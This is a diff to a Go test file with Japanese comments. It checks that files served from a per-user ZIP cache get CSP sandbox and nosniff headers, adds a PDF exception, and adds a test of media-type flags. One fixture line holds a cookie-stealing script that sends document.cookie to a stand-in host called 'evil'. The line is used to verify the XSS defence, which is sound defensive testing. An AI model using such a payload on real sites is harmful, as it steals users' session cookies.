@@ -6,9 +6,11 @@ import (
 	"net/http/httptest"
 	"os"
 	"path/filepath"
+	"strings"
 	"testing"
 	"time"
 
+	"github.com/mt3hr/gkill/src/server/gkill/api/req_res"
 	"github.com/mt3hr/gkill/src/server/gkill/dao/account"
 	"github.com/mt3hr/gkill/src/server/gkill/dao/account_state"
 	"github.com/mt3hr/gkill/src/server/gkill/main/common/gkill_options"
@@ -192,6 +194,11 @@ func TestZipCacheFileServeIsolatesUsers(t *testing.T) {
 // HttpOnly を付けられないため、同一オリジンでスクリプトが動くと読み出せてしまう。
 // CSP sandbox は allow-scripts を付けていないので中のJSは実行されない。
 //
+// 例外として .pdf は sandbox を付けない（付けると opaque origin になり
+// Chrome の内蔵PDFビューワが無効化されて表示できないため）。
+// nosniff は .pdf にも付き、Content-Type は application/pdf に固定されるので、
+// HTMLを .pdf にリネームして持ち込んでもHTMLとしては解釈されない。
+//
 // ルート登録は serve.go と同じ形にしないとラッパーを通らないので注意。
 func TestZipCacheFileServeSetsSecurityHeaders(t *testing.T) {
 	gkillAPI, optCleanup := setupTestGkillServerAPI(t)
@@ -204,21 +211,126 @@ func TestZipCacheFileServeSetsSecurityHeaders(t *testing.T) {
 	defer ts.Close()
 
 	sessionID := addZipCacheTestUser(t, gkillAPI, "carol")
-	// ZIPの中身としてHTMLが混じっている状況を作る
+	// ZIPの中身としてHTMLやPDFが混じっている状況を作る
 	// index.html は http.FileServer がディレクトリへリダイレクトしてしまうので別名にする
 	htmlPath := writeZipCacheFile(t, "carol", "comics", "cccccccc", "page.html",
 		"<script>fetch('//evil/'+document.cookie)</script>")
+	pdfPath := writeZipCacheFile(t, "carol", "comics", "cccccccc", "doc.pdf",
+		"%PDF-1.4 dummy")
+	upperPdfPath := writeZipCacheFile(t, "carol", "comics", "cccccccc", "DOC.PDF",
+		"%PDF-1.4 dummy")
 
-	resp := getZipCache(t, ts, htmlPath, sessionID)
-	defer resp.Body.Close()
+	t.Run("HTMLにはsandboxとnosniffが付く", func(t *testing.T) {
+		resp := getZipCache(t, ts, htmlPath, sessionID)
+		defer resp.Body.Close()
 
-	if resp.StatusCode != http.StatusOK {
-		t.Fatalf("status = %d, want 200", resp.StatusCode)
+		if resp.StatusCode != http.StatusOK {
+			t.Fatalf("status = %d, want 200", resp.StatusCode)
+		}
+		if got := resp.Header.Get("X-Content-Type-Options"); got != "nosniff" {
+			t.Errorf("X-Content-Type-Options = %q, want %q", got, "nosniff")
+		}
+		if got := resp.Header.Get("Content-Security-Policy"); got != "sandbox" {
+			t.Errorf("Content-Security-Policy = %q, want %q", got, "sandbox")
+		}
+	})
+
+	t.Run("PDFにはsandboxが付かずnosniffは付く", func(t *testing.T) {
+		resp := getZipCache(t, ts, pdfPath, sessionID)
+		defer resp.Body.Close()
+
+		if resp.StatusCode != http.StatusOK {
+			t.Fatalf("status = %d, want 200", resp.StatusCode)
+		}
+		if got := resp.Header.Get("Content-Security-Policy"); got != "" {
+			t.Errorf("Content-Security-Policy = %q, want empty", got)
+		}
+		if got := resp.Header.Get("X-Content-Type-Options"); got != "nosniff" {
+			t.Errorf("X-Content-Type-Options = %q, want %q", got, "nosniff")
+		}
+		if got := resp.Header.Get("Content-Type"); !strings.HasPrefix(got, "application/pdf") {
+			t.Errorf("Content-Type = %q, want application/pdf", got)
+		}
+	})
+
+	t.Run("拡張子の大小は無視してPDF扱いする", func(t *testing.T) {
+		resp := getZipCache(t, ts, upperPdfPath, sessionID)
+		defer resp.Body.Close()
+
+		if resp.StatusCode != http.StatusOK {
+			t.Fatalf("status = %d, want 200", resp.StatusCode)
+		}
+		if got := resp.Header.Get("Content-Security-Policy"); got != "" {
+			t.Errorf("Content-Security-Policy = %q, want empty", got)
+		}
+	})
+}
+
+// TestBuildZipEntriesMediaFlags は、ZIP展開物の一覧に付く種別フラグが
+// 拡張子どおりに立つことを確認する。フラグはクライアントの
+// 「クリックしたときの開き方」（プレビュー・再生・新タブ・ダウンロード）の分岐に使われる。
+func TestBuildZipEntriesMediaFlags(t *testing.T) {
+	cacheDir := t.TempDir()
+	files := []string{
+		"movie.mp4", "song.mp3", "doc.pdf", "photo.png",
+		"note.txt", "script.ts", "archive.bin",
 	}
-	if got := resp.Header.Get("X-Content-Type-Options"); got != "nosniff" {
-		t.Errorf("X-Content-Type-Options = %q, want %q", got, "nosniff")
+	for _, name := range files {
+		if err := os.WriteFile(filepath.Join(cacheDir, name), []byte("x"), 0o600); err != nil {
+			t.Fatalf("failed to write %s: %v", name, err)
+		}
 	}
-	if got := resp.Header.Get("Content-Security-Policy"); got != "sandbox" {
-		t.Errorf("Content-Security-Policy = %q, want %q", got, "sandbox")
+	if err := os.MkdirAll(filepath.Join(cacheDir, "sub"), os.ModePerm); err != nil {
+		t.Fatalf("failed to create subdir: %v", err)
+	}
+	if err := os.WriteFile(filepath.Join(cacheDir, "sub", "inner.mp4"), []byte("x"), 0o600); err != nil {
+		t.Fatalf("failed to write sub/inner.mp4: %v", err)
+	}
+
+	entries, err := buildZipEntries(cacheDir, "comics", "cccccccc")
+	if err != nil {
+		t.Fatalf("buildZipEntries failed: %v", err)
+	}
+	byPath := map[string]*req_res.ZipEntry{}
+	for _, entry := range entries {
+		byPath[entry.Path] = entry
+	}
+
+	type flags struct {
+		isDir, isImage, isText, isVideo, isAudio, isPdf bool
+	}
+	wants := map[string]flags{
+		"movie.mp4": {isVideo: true},
+		"song.mp3":  {isAudio: true},
+		"doc.pdf":   {isPdf: true},
+		"photo.png": {isImage: true},
+		"note.txt":  {isText: true},
+		// .ts はTypeScriptとMPEG-TSの両方に該当する既知の重複。
+		// クライアントはテンプレートの分岐順（is_text優先）でテキストビューワーに寄せている
+		"script.ts":     {isText: true, isVideo: true},
+		"archive.bin":   {},
+		"sub":           {isDir: true},
+		"sub/inner.mp4": {isVideo: true},
+	}
+	if len(byPath) != len(wants) {
+		t.Errorf("entries = %d, want %d", len(byPath), len(wants))
+	}
+	for path, want := range wants {
+		entry := byPath[path]
+		if entry == nil {
+			t.Errorf("entry %q not found", path)
+			continue
+		}
+		got := flags{
+			isDir:   entry.IsDir,
+			isImage: entry.IsImage,
+			isText:  entry.IsText,
+			isVideo: entry.IsVideo,
+			isAudio: entry.IsAudio,
+			isPdf:   entry.IsPdf,
+		}
+		if got != want {
+			t.Errorf("%q flags = %+v, want %+v", path, got, want)
+		}
 	}
 }
